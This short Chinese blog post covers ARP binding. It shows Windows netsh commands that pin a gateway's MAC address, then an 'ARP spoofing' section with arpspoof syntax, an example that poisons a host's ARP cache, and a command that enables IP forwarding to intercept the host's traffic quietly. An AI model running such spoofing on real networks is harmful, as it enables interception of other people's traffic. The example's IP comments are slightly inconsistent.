---
layout: post
title: arp绑定
subtitle:
date:       2021-05-19 17:38:27
categories: [安全]
tags: [安全,arp绑定]
---


# mac
1.查询接口
```
netsh i i show in
#netsh interface ipv4 show interface


Idx     Met         MTU          状态                名称
---  ----------  ----------  ------------  ---------------------------
  1          50  4294967295  connected     Loopback Pseudo-Interface 1
 63          20        1500  connected     以太网


```
2. 绑定MAC 地址
```
>netsh -c "i i" add neighbors 63 "192.168.1.254" "38-22-d6-a1-0a-bc"
>arp -a  # 查看
``` 


# arp 欺骗
```
arpspoof [-i 网卡] [-t 要欺骗的目标主机] [-r] 要伪装成的主机

# 转发到本机 192.168.1.55
>arp -i eth0 -t 192.168.0.100 192.168.0.254
## 主机 192.168.0.100 会把 192.168.1.55 当作网关，把所有的数据发送到0.55

## 主机不会把数据包转发大网关 ，导致目标无法上网
## 开启转发
># echo 1>>/proc/sys/net/ipv4/ip_forward
```
